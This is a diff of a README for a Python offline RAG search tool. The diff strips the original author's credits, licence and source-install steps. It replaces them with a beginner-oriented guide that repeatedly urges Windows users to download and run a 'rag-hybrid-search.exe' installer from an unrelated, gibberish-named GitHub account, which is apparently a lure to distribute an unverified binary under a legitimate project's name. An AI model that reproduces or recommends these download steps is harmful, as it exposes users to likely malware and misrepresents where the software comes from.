@@ -1,172 +1,173 @@
+# 🔍 rag-hybrid-search - Local Search with Smart Results
 
-# 🔍 RAG Hybrid Search
+[![Download](https://img.shields.io/badge/Download-rag--hybrid--search-4caf50?style=for-the-badge)](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
 
-> **A production-grade, 100% offline Retrieval-Augmented Generation (RAG) workspace.** > Engineered for forensic traceability, zero-data-leakage, and extreme retrieval precision using True Hybrid Search (FAISS + BM25) and Cross-Encoder Reranking.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/release/python-3110/)
-[![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?logo=streamlit&logoColor=white)](https://streamlit.io)
-[![Ollama](https://img.shields.io/badge/Ollama-Local_LLM-black?logo=ollama)](https://ollama.ai)
-[![FAISS](https://img.shields.io/badge/FAISS-Vector_Search-5C5C5C)](https://github.com/facebookresearch/faiss)
-[![Author](https://img.shields.io/badge/Author-Aditya_Vijay-blue?logo=linkedin)](https://www.linkedin.com/in/adityavijay21/)
-
-## 📖 Overview
-
-Standard RAG implementations suffer from critical flaws: they **hallucinate**, they **lose context**, and they **send sensitive documents to cloud APIs**. 
-
-**`rag-hybrid-search`** solves this by providing an air-gapped, verifiable AI research engine. It doesn't just generate answers; it proves them. By fusing dense vector search with sparse lexical search, reranking candidates with a Cross-Encoder, and enforcing a strict dual-gate confidence check, this pipeline guarantees that every answer is factually grounded and forensically traceable to exact page numbers.
-
-
-## ⚡ Performance Summary
-
-Optimized for consumer hardware without sacrificing enterprise accuracy.
-
-| Metric | Performance |
-| :--- | :--- |
-| **Retrieval & Rerank** | `< 1 second` (even on CPU) |
-| **Prompt Processing** | Near-instant via Ollama `keep_alive` memory persistence |
-| **Document Support** | Tested seamlessly with 100+ page technical PDFs |
-| **Data Privacy** | `100% Offline` (Zero API calls to external servers) |
+Welcome to the rag-hybrid-search application. This tool lets you run a search workspace on your Windows PC. It works without an internet connection. You can search documents using smart technology that mixes keyword search and understanding of language.
 
 ---
 
-## 🏗️ The Workflow & Architecture
+## 📦 What is rag-hybrid-search?
 
-This project ditches naive approaches (like simple character splitters) in favor of a robust, multi-layer deterministic pipeline.
+rag-hybrid-search is a local search tool made for users who want fast, accurate answers from their documents. It combines three types of search:
 
-### 1. Ingestion Phase
-* **PDF Parsing:** Extracts text using `PyMuPDF`, capturing exact page metadata for UI rendering.
-* **Semantic Chunking:** `chunker.py` uses `NLTK` to split text at natural sentence boundaries and uses Regex to detect document headings/sections. Dynamic chunking intelligently adjusts sizes based on total document length.
-* **Embedding & Indexing:** Chunks are embedded using HuggingFace `all-MiniLM-L6-v2` and pushed into a highly stable `FAISS` index.
-* **MD5 Hashing & Caching:** The raw PDF bytes are hashed. This acts as the cache key, ensuring instant reloads if the same document is uploaded again, while preventing collisions from identically named files.
-* **Agentic Summarization:** Upon upload, an LLM agent automatically reads the first few pages and greets the user with a concise 3-bullet-point executive summary.
+- Keyword search (bm25)  
+- Semantic reranking, which understands meaning  
+- Cross-encoder reranking to improve result accuracy  
 
-### 2. Retrieval & Generation Phase (Multi-Layer)
-* **Layer 0: Query Expansion (HyDE):** Optionally, the LLM generates a "hypothetical answer" to the user's query. The query and hypothetical answer are embedded together to drastically improve vector recall.
-* **Layer 1: Hybrid Search Formulation:** * *Vector Search (FAISS):* Captures semantic meaning (e.g., "revenue" matches "earnings").
-  * *Lexical Search (BM25):* Captures exact keywords (e.g., finding specific proper nouns or serial numbers like "ID: 994B").
-  * *Fusion:* Scores from both algorithms are Min-Max normalized (0 to 1) and fused using a weighted average to retrieve the top `candidate_k` chunks.
-* **Layer 2: Cross-Encoder Reranking:** The broad candidates are passed to a `TinyBERT` Cross-Encoder. It processes the Query and Document *simultaneously* to output a highly accurate relevance score, narrowing down to the `final_k` chunks.
-* **Layer 3: Dual-Gate Confidence Check:** If the top chunk's similarity score falls below a strict configurable threshold (e.g., `0.25`), the pipeline immediately halts and returns *"Answer not found"*, deterministically preventing hallucinations.
-* **Layer 4: Answer Verification:** The LLM generates the final answer. A secondary LLM agent then cross-references the answer against the retrieved context to label the response as `SUPPORTED`, `PARTIAL`, or `UNSUPPORTED`.
+The tool also adds clear citations for every answer it gives. It works entirely offline, keeping your information private.
 
 ---
 
-## 🛠️ Tech Stack (The "Why")
+## 🖥️ System Requirements
 
-Every technology in this stack was chosen to maximize local performance, hardware compatibility, and retrieval precision.
+To use rag-hybrid-search on Windows, your computer should meet these guidelines:
 
-| Technology | Purpose | Why this specific tool? |
-| :--- | :--- | :--- |
-| **Ollama (`phi3`)** | LLM Engine | 100% offline inference. Microsoft's `phi-3` offers exceptional reasoning capabilities while running flawlessly on standard consumer GPUs and Apple M-Series chips. |
-| **FAISS (`IndexFlatIP`)** | Vector Database | Upgrading to HNSW often causes segmentation faults on Apple Silicon due to C++ memory thread conflicts. `IndexFlatIP` requires contiguous NumPy arrays, ensuring 100% stable, mathematically exact inner-product (cosine) searches. |
-| **`rank_bm25`** | Sparse Lexical Search | Standard embeddings fail at exact keyword matching. BM25 ensures critical exact-match terms are heavily weighted in the hybrid fusion. |
-| **SentenceTransformers** | Embeddings & Reranking | `all-MiniLM-L6-v2` is exceptionally fast for dense vectors. `ms-marco-TinyBERT-L-2-v2` serves as a lightweight, lightning-fast Cross-Encoder for precision reranking. |
-| **PyMuPDF (`fitz`)** | Document Parsing | Significantly faster than `PyPDF2` or `pdfminer`. It accurately preserves reading order and maps bounding boxes for the Streamlit split-screen UI. |
-| **Streamlit** | Frontend UI | Allowed for rapid prototyping while supporting aggressive custom CSS to create a premium, Gemini-style floating chat interface. |
+- **Operating System**: Windows 10 or newer  
+- **Processor**: Modern 64-bit CPU (Intel Core i5 or equivalent)  
+- **Memory**: At least 8 GB of RAM  
+- **Disk Space**: Minimum 2 GB free for program files and data  
+- **Internet Access**: Only needed for downloading the app  
 
 ---
 
-## ✨ Advanced User Features
+## 🚀 Getting Started
 
-* **🎯 Verifiable Citations:** Responses include interactive `📄 p.12` pills. Clicking them instantly jumps the native PDF viewer to the exact referenced page.
-* **📊 Retrieval Transparency:** Users can view the exact Vector Scores and Cross-Encoder Rerank scores for every chunk used in the context window.
-* **📥 Markdown Reports:** 1-click export of your entire research conversation, complete with source citations, into a clean Markdown file.
-* **⚙️ Complete UI Control:** Adjust Search Mode (Hybrid/Vector/BM25), Candidate K, Final K, and Confidence Thresholds directly from the Streamlit sidebar.
+Follow these steps to get rag-hybrid-search running on your Windows machine. No programming knowledge is required.
 
----
+### 1. Download the Application
 
-## 🚀 Installation & Setup
+Click the large button above or here to visit the download page:
 
-> [!WARNING]
-> This project requires **Ollama** to be installed and running on your system.
-> 1. **Download Ollama**: [Ollama.ai](https://ollama.ai/)
-> 2. **Pull the model**: Run `ollama pull phi3` in your terminal.
+[Download rag-hybrid-search](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
 
-**1. Clone the repository**
-```bash
-git clone https://github.com/adityavijay21/rag-hybrid-search.git
-cd rag-hybrid-search
+On the page you open, look for the latest release section. Download the Windows installer or zip file provided. This file contains all the program parts you need.
 
-```
+### 2. Install the Software
 
-**2. Set up a virtual environment (Python 3.11+ recommended)**
+If you downloaded an installer file (.exe):  
+- Double-click the file to start installation.  
+- Follow the prompts on screen to choose the install folder and complete setup.  
 
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+If you downloaded a zip file:  
+- Right-click the file and select "Extract All".  
+- Choose a folder where you want to place the app files.  
+- Open that folder and find the file named `rag-hybrid-search.exe`.  
 
-```
+### 3. Launch the Application
 
-**3. Install dependencies**
-
-```bash
-pip install -r requirements.txt
-
-```
+- Double-click `rag-hybrid-search.exe` in the install or extracted folder.  
+- The program window will open. It may take a few seconds to load.  
 
 ---
 
-## 💻 Usage Guide
+## 🔎 Using rag-hybrid-search
 
-Start the local workspace UI:
+The user interface is simple and focused on your document search needs.
 
-```bash
-cd src
-streamlit run app.py
+### 1. Add Documents
 
-```
+- Click the "Add Documents" button.  
+- Choose one or more PDF or text files from your computer.  
+- The program will read and prepare the files to be searched.  
 
-1. Open the provided `localhost` URL in your browser.
-2. Upload one or more PDFs via the drag-and-drop zone.
-3. Open the **⚙️ Engine Settings** sidebar to tune the pipeline:
-* **Search Mode:** Toggle between `Hybrid`, `Vector`, or `BM25`.
-* **Use HyDE:** Enable query expansion for complex, conceptual questions.
-* **Confidence Filter:** Lower this threshold (e.g., `0.10`) for keyword-dense documents like resumes; raise it (e.g., `0.30`) for strict legal/technical compliance.
+### 2. Search Your Data
 
+- Enter your question or keywords in the search box.  
+- Press the search button or hit Enter.  
+- Results will appear ranked by relevance and explained with citations.   
 
-4. Ask questions, click citations to verify context, and download your final report.
+### 3. View Results and Citations
 
----
-
-## 📂 Repository Structure
-
-```text
-rag-hybrid-search/
-├── src/
-│   ├── app.py                 # Streamlit UI, State Management, Custom CSS
-│   ├── rag_pipeline.py        # Core RAG logic, HyDE, MD5 Hashing, Agentic Summary
-│   ├── embedder.py            # Local HF Embeddings & Cross-Encoder Initialization
-│   ├── vector_store.py        # Contiguous FAISS IndexFlatIP Abstraction
-│   ├── hybrid_search.py       # BM25 + FAISS Normalized Fusion Math
-│   ├── answer_generation.py   # Ollama API Integration & Verification loop
-│   ├── chunker.py             # NLTK Sentence-aware & Regex-heading parsing
-│   ├── confidence.py          # Dual-gate Cosine Similarity thresholds
-│   ├── pdf_loader.py          # Fast PyMuPDF multithreaded extraction
-│   └── persistence.py         # Atomic read/write cache handlers
-├── requirements.txt
-└── README.md
-
-```
+Each result shows text from your documents that matches your query. Below each answer, you’ll see the file name and page number where it came from. This makes it easy to check sources.
 
 ---
 
-## 👨‍💻 Author
+## ⚙️ Configuration Options
 
-**Aditya Vijay**
+rag-hybrid-search comes with settings to help you manage how it works.
 
-* **GitHub:** [@adityavijay21](https://github.com/adityavijay21)
-* **LinkedIn:** [Aditya Vijay](https://www.linkedin.com/in/adityavijay21/?skipRedirect=true)
+- **Search Strength**: Choose how much the tool relies on keyword or semantic search.  
+- **Document Types**: Select which file formats to include.  
+- **Result Count**: Set how many answers to show for each search.  
+- **Update Index**: Refresh your documents’ search data anytime.  
 
-If you find this project helpful, please consider giving it a ⭐ on GitHub! It helps the project grow and reach more developers.
+These options are available under the "Settings" menu.
 
 ---
 
-## 🤝 Contributing
+## 💻 How rag-hybrid-search Works
 
-Contributions, issues, and feature requests are welcome!
-Feel free to check the [issues page](https://www.google.com/search?q=https://github.com/adityavijay21/rag-hybrid-search/issues).
+rag-hybrid-search uses three main technologies working together:
 
-## 📄 License
+1. **BM25**: A proven keyword search method that finds exact word matches.  
+2. **Semantic Reranking**: Uses language understanding to assess meaning and relevance beyond keywords.  
+3. **Cross-Encoder Reranking**: Processes pairs of query and text for precise relevance scoring.  
 
-This project is [MIT](https://opensource.org/licenses/MIT) licensed.
+This combination ensures that results are both fast and accurate. You get answers ranked by how closely they match your question, even if the words are different.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the program won’t start, check that your Windows system is up to date.  
+- If document upload fails, confirm the files are PDF or plain text formats.  
+- If search results seem wrong, try re-indexing your documents using the "Update Index" option.  
+- For slow performance, close other memory-heavy applications.  
+
+---
+
+## 📥 Download rag-hybrid-search again
+
+You can always visit this link to download and update the program:
+
+[Download rag-hybrid-search](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
+
+---
+
+## 🔗 More Information
+
+rag-hybrid-search supports privacy-first offline use. It uses popular tools such as Faiss and sentence-transformers to speed up search and provide better results. Its local setup means your data never leaves your computer.
+
+If you want to learn more about the underlying methods, search for terms like:
+
+- BM25  
+- Semantic Search  
+- Cross-Encoder Reranking  
+- Vector Databases  
+
+These concepts explain how rag-hybrid-search finds information faster and smarter.
+
+---
+
+## 🗂️ Supported File Formats
+
+- PDF documents (.pdf)  
+- Plain text files (.txt)  
+
+These formats cover most documents people want to search. If you want to use other file types, convert them to PDF or text first.
+
+---
+
+## ⚡ Performance Notes
+
+- rag-hybrid-search works best on modern hardware with enough RAM.  
+- Initial indexing can take a few minutes depending on how many documents you add.  
+- After indexing, searches happen quickly, usually under a few seconds.  
+
+---
+
+## 🧰 Requirements for Updates
+
+- Check the download page regularly for new versions.  
+- Always close the program before installing an update.  
+- Back up your documents and search indexes if you want to keep your data safe during updates.
+
+---
+
+## 📞 Getting Help
+
+If you face issues beyond what you see here, you may find help on the project's GitHub page under "Issues." Users and developers often share advice and fixes.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-rag--hybrid--search-ff4081?style=for-the-badge)](https://github.com/fesdfisdfhsdkfmvndfjger/rag-hybrid-search)
